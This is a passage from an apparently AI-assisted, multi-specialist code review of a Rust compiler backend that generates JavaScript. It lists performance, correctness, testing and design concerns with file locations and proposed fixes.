**M3: O(n×m) class name validation on per-element hot path** (MEDIUM)
- **Location**: `view/element.rs:240-262`
- **Issue**: For each element's each class name, linear scan of all design blocks' all classes. 10 class names × 50 elements × 100 design classes = 50,000 string comparisons per codegen.
- **Fix**: Pre-build global `FxHashSet<String>` of all design class names during initialization (S effort).

**L1**: Editor bridge `querySelectorAll` with `forEach` (minor, called once)
**L2**: Warning vector unbounded growth (bounded by compilation scope)
**L3**: O(n) `event_types.contains()` on Vec (n < 10 in practice)

#### Recommendations
**Immediate**: Replace `push_str(&format!(...))` with `write!` on hot paths (S), pre-build design class name HashSet (S).
**Short-term**: Incremental component codegen for editor (M), eliminate ViewTree clone (M), optimize `escape_html` (S).
**Long-term**: JS output size optimizer, compiler benchmarks.

#### Risks if Unaddressed
- Editor latency >500ms per keystroke for 30+ component projects
- Cold-start compilation time of tens of seconds for large design systems
- Gradual allocation bloat as new features add more `format!` calls with no performance guardrails

---

### Implementation Strategist — Change Sequencing & Blast Radius

**Perspective**: Evaluates HOW and WHEN changes should be implemented — blast radius, reversibility, technical readiness, and timing.

#### Key Observations
1. 84% of 10,738 lines is OmniView-specific, 16% is shared across 9 backends via `omnilang-core`
2. 27% of code (~2,200 lines) in 5 subsystems has zero unit test coverage
3. 46-field Generator creates subtle implicit ordering dependencies between fields
4. Two known deferred items are "chaos magnets" — multi-instance state, motion trigger merge
5. Feature-gated backends mean CI cannot catch full-compilation breakage

#### Strengths
1. JS execution order guarantee is well-designed — 6-phase sequence is physically enforced by single-pass design
2. Deferred JS swap pattern enables clean rollback (re-run generation)
3. CSS-only mode provides clean degradation path for editor canvas
4. Cross-target compilation tests catch "silent drop" category bugs
5. Zero unwrap/expect discipline means rollbacks rarely come from crashes

#### Concerns

**C1: Motion trigger duplication doubles merge work** (HIGH)
- **Location**: `motion_triggers.rs:340-600`
- **Issue**: Remaining Enter/Hover/Press/Focus/Leave/Animate/Timeline triggers duplicate JS output for named-reference vs inline modes. InView/Scroll/Drag already unified in ADR-025.
- **Fix**: Extract remaining trigger types following existing InView/Scroll/Drag pattern (M effort).

**C2: Multi-instance component state collision needs XL fix with no incremental path** (HIGH)
- **Location**: `component_html.rs:77-101`
- **Issue**: Non-@for multi-instance components share global signals. Two `<TabPanel>` instances write/read the same JS variable. No existing test covers multi-instance.
- **Fix**: Emit compiler warning when component is inlined multiple times (S effort, mitigation). Full fix requires per-instance signal isolation (XL effort).

**C3: ViewTree clone on component inlining creates hot-path GC pressure** (HIGH)
- **Location**: `component_html.rs:118` — `let child_view_owned = child_view.clone();`
- **Issue**: Full ViewTree clone per inlining level. Depth-5 component hierarchy = 5 full AST clones. 50+ inlined components on production pages amplifies this.
- **Fix**: Extract view reference before mutable borrow scope (M effort).

**C4: Shared code vs OmniView custom duplication doubles change blast radius** (MEDIUM)
- **Location**: `stmt.rs:329 lines` + `expr.rs:419 lines` vs shared `FormatStmt`/`FormatExpr` trait system
- **Issue**: OmniView uses separate code path for statement/expression emission from the shared trait system used by 8 other backends. Adding a new IR variant requires implementation in two places.
- **Fix**: Consolidate OmniView's statement/expression emission through `FormatExpr`/`FormatStmt` traits (L effort).

**C5: Test coverage gaps delay deployment of any subsystem change** (LOW→elevated)
- **Location**: `motion_triggers.rs`, `timeline.rs`, `list.rs`, `editor.rs`, `debug.rs`
- **Issue**: Zero unit test coverage for 5 most complex subsystems. Any change is a blind operation.
- **Fix**: Add tests before changing subsystems — parameterized tests for motion trigger types, @for edge cases, editor bridge message handling.

**C6: Feature-gated CI blind spot** (LOW)
- **Location**: `codegen/mod.rs:9-34`, `Cargo.toml`
- **Issue**: 9 backends behind `codegen-*` features. Default `cargo test` only enables subset. Shared code changes may not fail on untested feature combinations.
- **Fix**: Add `cargo check --workspace --all-features` to CI matrix (S effort).

#### Recommendations (9 items, S to XL effort, immediate to long-term)

---

### AI Engineer — AI/Editor Integration

**Perspective**: Evaluates how the codegen's structured metadata, error handling, runtime architecture, and WASM/editor boundary support or hinder AI-powered editor features and observability-driven debugging.

#### Key Observations
1. `OmniViewOutput` with `element_tree`, `nid_map`, `element_classes`, `per_component_css` is the primary data contract between compiler and editor
2. WASM boundary is well-guarded with input size limits and structured error responses
3. Error reporting at runtime level is universal but unstructured — all errors report identically with no severity or codes
4. Signal runtime (~200 lines, embedded) is untested as a standalone unit
5. Type information is lost at the WASM boundary

#### Strengths
1. Comprehensive structured metadata for editor integration (element tree, nid_map, element_classes)
2. Defensive runtime error handling with multi-channel observability (console, buffer, postMessage)
3. Clean separation of editor vs production mode (editor_mode/debug_mode flags, css_only reuse)
4. JS execution order guarantee documented and enforced
5. Per-component hot-replace architecture with signal-preserving replacement

#### Concerns

**M1: Runtime error reporting lacks categorization** (MEDIUM)
- **Location**: `runtime.rs:97-113`, `component_html.rs:188,201,209`, `view/mod.rs:190`
- **Issue**: All errors reported identically — no severity, no error codes, no recovery hints. 100-entry FIFO means transient error burst evicts the real bug.
- **Fix**: Add `severity` and `code` fields to error objects; use prefixed contexts like `"warn:interpolation:text"` vs `"fatal:event:click"` (S effort).

**M2: Signal runtime untested as standalone unit** (MEDIUM)
- **Location**: `runtime.rs:14-141`
- **Issue**: No test file for runtime behavior. Tests verify compiler string output, not runtime execution correctness.
- **Fix**: Add JS test suite exercising signal propagation, dependency tracking, effect re-execution, and cleanup (M effort).

**M3: No type information in runtime signal registry** (MEDIUM)
- **Location**: `store.rs:54-65`, `mod.rs:39-70`, `mod.rs:445-468`
- **Issue**: Editor cannot inspect signal types, default values, or constraints. Must reconstruct from runtime values or parse original source.
- **Fix**: Emit optional type metadata alongside signal declarations in editor mode (L effort).

**M4: `__omni_replaceComponent` eval without factory validation** (MEDIUM)
- **Location**: `editor.rs:102`
- **Issue**: Malformed compilation → `SyntaxError` in eval → component already torn down → blank region with no recovery.
- **Fix**: Wrap eval in try/catch, emit `omni-replace-error`, restore old component on failure (S effort).

**L1: Element tree uses `#text` pseudo-tags with no documentation** (LOW)
**L2: Loose HTML escaping in interpolated attribute values** (LOW)

#### Recommendations
**Immediate** (S effort): Add eval factory validation, add error severity prefixes, document `#text` convention.
**Short-term** (M effort): Add runtime unit tests, audit HTML attribute escaping.
**Long-term** (L effort): Add type metadata to runtime, structured error reporting channel.

---

### Pragmatic Enforcer — YAGNI & Simplicity

**Perspective**: Evaluates against YAGNI principles — questioning whether each abstraction, trait, file boundary, and flag carries its weight in actual consumption.

#### Key Observations
1. Aggressive refactoring cycle produced current 17+5 file structure from prior monolithic `html.rs`
2. 9 codegen backends but only 3 are UI targets with shared `UiCodegen` trait
3. Three orthogonal flags create 8 combinations, only 3-4 used in practice
4. 46-field Generator is legitimately necessary accumulation pattern — almost every field consumed during generation
5. Motion code split across 4 files (1,370 lines) with fuzzy boundaries between `motion.rs` and `motion_config.rs`

#### Strengths
1. Deferred JS swap pattern — elegant, avoids buffered writer abstraction
2. `project_uses_motion()` guard — correct YAGNI application for 46KB runtime
3. `element_tree_stack` + `tree_push`/`tree_pop`/`tree_text` — minimal tree builder, pragmatic
4. No unnecessary generics or type parameters
5. View submodule split (`element.rs`, `events.rs`, `style.rs`) is well-judged

#### Concerns

**M1: Unused UiCodegen trait + 3 full implementations — dead abstraction** (MEDIUM)
- **Location**: `ui_codegen.rs:31-63`, `mod.rs:711-734`, React impl, Vue impl
- **Issue**: ~120 lines of dead code across trait definition + 3 impls. Zero call sites. OmniView impl re-runs full `generate()` pipeline if ever called.
- **Fix**: Remove unused impls; keep trait definition in `omnilang-core` only if integration planned within 2 sprints (S effort).

**M2: `editor.rs` mixes editor bridge code with view-rendering logic** (MEDIUM)
- **Location**: `editor.rs:17-115` (bridge) vs `editor.rs:122-269` (conditional rendering)
- **Issue**: `emit_conditional_html` shares structure with `view/condition.rs`, not with the postMessage handler above it. Documented workaround.
- **Fix**: Move `emit_conditional_html` to `view/conditional.rs` or `view/mod.rs` (S effort).

**L1: `StyleResolveResult` partially duplicates `OmniViewOutput`** (LOW)
**L2: `debug.rs` as standalone file (1 method, 129 lines)** (LOW)
**L3: `finalize_js()` lives in `store.rs` but has no store logic** (LOW)

#### Recommendations
**Immediate** (S): Remove unused UiCodegen impl, move `finalize_js()` inline.
**Short-term** (M): Merge `emit_conditional_html` into view submodule, merge `emit_debug_bridge` into `editor.rs`.
**Long-term** (L): Consider removing UiCodegen trait entirely if multi-target UI component generation not planned.

---

### Rust Expert (Katya Volkov) — Rust Safety & Idioms

**Perspective**: Evaluates memory safety, ownership patterns, zero-cost abstractions, and Rust idiom adherence.

#### Key Observations
1. Zero unsafe blocks, zero production unwrap — clippy clean with 1 suppressed warning
2. Stateful accumulation with explicit ordering — single-pass String buffer accumulation
3. Per-component name renames with global fallback — dual-resolution chain correctly scoped
4. ~54 test functions across 3 files — reasonable coverage for 10,738 lines
5. `FxHashMap`/`FxHashSet` used consistently — no unnecessary hash-building allocations

#### Strengths
1. Efficient string building via `write!` and `push_str` rather than `format!`
2. Clean deferred buffer pattern — textbook ownership transfer to enforce execution ordering
3. Sound per-component signal isolation with consistent save/restore
4. No unnecessary dependency on `anyhow`/`thiserror`
5. Well-scoped public visibility — `pub(super)` for internal helpers, only essential types public

#### Concerns

**M1: `format_mutation_stmt_inline` produces non-JS for all mutation types** (MEDIUM)
- **Location**: `stmt.rs:170-215`
- **Issue**: Returns literal strings like `"{t} direct_assign {v}"` for every `MutationIntent` variant. Not valid JavaScript.
- **Fix**: Extract shared `format_mutation_to_js()` helper from `emit_mutation` (S effort).

**M2: Full ViewTree clone on every component inlining** (MEDIUM)
- **Location**: `component_html.rs:118` — `let child_view_owned = child_view.clone();`
- **Issue**: Deep clone of entire child component's view tree AST to break borrow conflict.
- **Fix**: Extract ViewTree reference before mutable borrow scope (M effort).

**L1: `for_state_names` and `for_rebind_fn` never cleared between components** (LOW)
**L2: `emit_element_props` is 185 lines handling four concerns** (LOW)
**L3: Theme name deduplication uses `Vec::contains` instead of `HashSet`** (LOW)
**L4: `try_inline_component` branches share significant duplication** (LOW)

#### Recommendations
**Immediate** (S): Fix `format_mutation_stmt_inline`, clear `for_state_names`/`for_rebind_fn`.
**Short-term** (M): Eliminate ViewTree clone, extract attribute/class validation methods, dedup signal registration.
**Long-term** (M-L): Replace hardcoded 50-attribute match with lookup set, consider `CodegenMode` strategy object.

---

### TypeScript & React Specialist (Emma Rodriguez) — Generated JS Quality

**Perspective**: Evaluates generated JavaScript quality, reactive signal architecture correctness, and the bridge between generated DOM and the React-based Poiesis editor.

#### Key Observations
1. Generated JavaScript targets ES5 — `var`, `function` declarations, no arrow functions or template literals
2. Six-phase execution order well-documented but enforced by buffer swaps
3. Signal runtime is hand-rolled with classic subscriber/notify pattern (~100 lines)
4. Dual-mode text interpolation — `__omni_effect` (normal) vs `data-bind-text` markers (@for)
5. Structured element tree bridges codegen and React editor

#### Strengths
1. Thorough error handling in generated JS — try/catch everywhere with `__omni_reportError`
2. Pre-compiled @for bindings avoid runtime eval — safer and faster
3. Clean dependency cleanup in effects — old subscriptions cleared before re-execution
4. Well-ordered execution guarantee documentation
5. Element tree + nid_map abstraction enables React editor to render without HTML parsing

#### Concerns

**H1: Boolean attribute handling breaks silently on complex expressions** (HIGH)
- **Location**: `view/element.rs:136-167`
- **Issue**: String-based heuristic (`val_str.starts_with('{') && val_str.ends_with('}')`) only detects simple identifiers as dynamic. `disabled={!isEnabled}` or `checked={count > 0}` → `expr_to_static_str` returns `""` → falls through to bare attribute emission (always true).
- **Fix**: Replace heuristic with `ExprIR` type check: `let is_dynamic = !matches!(value, ExprIR::LiteralExpr { .. })` (S effort).

**H2: Mutation statements in BlockExpr produce invalid JavaScript** (HIGH)
- **Location**: `stmt.rs:170-216`
- **Issue**: `format_mutation_stmt_inline` returns debug strings, not valid JS. Called by `stmt_to_js_inline` → `BlockExpr` codegen.
- **Fix**: Route through real `emit_mutation` logic via buffer-capture pattern (S effort).

**M1: Computed signals recompute twice on dependency change** (MEDIUM)
- **Location**: `runtime.rs:56-81`
- **Issue**: Hybrid eager-update + lazy-read design causes `fn()` to be called once during `signal.set(fn())` propagation and again when subscriber reads `computed.value` with `dirty=true`.
- **Fix**: Have `effect.run()` update `val` directly without `signal.set(fn())` call, then notify subscribers manually (M effort).

**M2: Event delegation listeners not cleaned up on @for re-render** (MEDIUM)
**M3: @for DOM query duplication between initial bindings and rebind function** (MEDIUM)
**M4: Component event props — `querySelector` on every dispatch** (MEDIUM)

**L1: `__omni_effect` error recovery leaves `__omni_activeEffect` corrupted** (LOW)
**L2: Signal `.set(fn())` bypasses equality check for arrays/objects** (LOW)

#### Recommendations
**Immediate** (S): Fix boolean attribute detection, fix mutation inline codegen.
**Short-term** (XS-M): Cache component root element, consolidate @for bindings/rebind, add observer cleanup, guard BlockExpr path.
**Long-term** (M-XL): Refactor computed to avoid double recomputation, upgrade JS target to ES2015+, analyze lazy component loading.

---

### Compiler & Language Architect (Dr. Lin Wei) — IR & Codegen Pipeline

**Perspective**: Evaluates language design soundness, IR representation fidelity, multi-target codegen consistency, and the semantic gap between source language and compilation targets.

#### Key Observations
1. 46-field Generator replaces visitor pattern — any submodule can directly mutate any field with no encapsulation boundary
2. ViewTree IR is well-formed but enum-heavy — 6 variants, each traversal function must manually recurse into each variant
3. Component inlining is compile-time — no runtime component tree, but causes documented multi-instance state limitation
4. JS execution order enforced by buffer swaps — 6-phase implicit protocol
5. UiCodegen trait is an architectural dead end — 3 implementations, zero call sites

#### Strengths
1. Deferred JS swap mechanism cleanly solves DOM-before-bindings problem without two-pass traversal
2. Runtime signal system compact (~130 lines), self-contained, memory-sound after ADR-025
3. Data-nid source mapping comprehensive — links generated positions back to source locations
4. Conditional animation runtime embedding correctly avoids unnecessary 46KB library
5. Expression compilation in `expr_to_js` correctly handles signal value access, store field access, @for template scope

#### Concerns

**H1: @for buffers corrupted in nested component inlining** (HIGH)
- **Location**: `list.rs:51-53`, `component_html.rs:31-121`
- **Issue**: When a component containing `@for` is inlined inside another `@for`, the inner loop's `emit_list_state_init` clears the outer loop's `for_text_bindings`/`for_class_bindings`/`for_attr_bindings`. Inner `emit_list_dom` sets `in_for_template = false`, breaking outer loop's template processing.
- **Trigger**: `<TagList tags={item.tags} />` where TagList contains `@for tag in tags { ... }`, inside outer `@for item in items { ... }`.
- **Fix**: Save/restore `for_*_bindings`, `for_rebind_fn`, and `in_for_template` around nested @for emission (S-M effort).

**M1: Source map span length hardcoded to 0** (MEDIUM)
- **Location**: `view/element.rs:614-628`
- **Issue**: `len: 0` hardcoded — source `Span`'s length is discarded. Editor highlight/selection accuracy depends on this.
- **Fix**: Propagate `len` from `el.source_span` (XS effort, 1 line).

**M2: UiCodegen trait methods are completely dead code** (MEDIUM)
- **Location**: `mod.rs:711-734`, `ui_codegen.rs:31-63`
- **Issue**: 75 lines of trait definition + implementation with zero call sites. OmniView's `generate_component_code` re-runs full pipeline if ever called (O(n²) trap).
- **Fix**: Remove or document as dead code (S effort).

**M3: Event emission pattern duplicated — 8 independent addEventListener generation points** (MEDIUM)
- **Location**: `view/events.rs:131-173`, `component_html.rs:170-235`
- **Issue**: 4 event handler types × 2 contexts = 8 separate generation points. New handler variant requires 4 manual updates.
- **Fix**: Extract shared `emit_element_event_listener(nid, js_event, handler)` method (M effort).

**L1: Per-element class name validation is O(n×m×K)** (LOW)
- **Location**: `view/element.rs:240-262`
- **Issue**: For each element's each class name, linear scan of all design blocks' all classes. No memoization.
- **Fix**: Pre-compute design class names into `FxHashSet<String>` at codegen start (S effort).

#### Recommendations
**Immediate** (S): Fix @for buffer corruption, fix source map span length.
**Short-term** (S-M): Remove/document UiCodegen dead code, extract shared event listener emission.
**Long-term** (L-XL): Formalize ViewTree visitor pattern, stack-based @for loop state.

#### Risks if Unaddressed
- Multi-instance component state (deferred ADR-025)
- Cross-target consistency (partial ADR-021/025 coverage)
- JS execution order implicit protocol (no compile-time or runtime verification)
- `test_new()` initializer sync (new field → two updates required, no compile-time mismatch detection)

---

## Review Metadata

- **Total files examined**: 25 source files + 2 test directories
- **Total lines**: ~10,738 implementation + ~3,651 test
- **ADR context**: ADR-021 through ADR-025 (5 ADRs from prior review cycles)
- **Previous review**: `component-omniview-2026-07-29.md` (8 specialists, 2026-07-29)
- **Methodology**: 11 parallel specialist subagents, independent deep-dive, cross-cut aggregation
- **Pragmatic mode**: enabled (balanced intensity)
- **Duration**: ~4 minutes wall-clock (parallel dispatch)
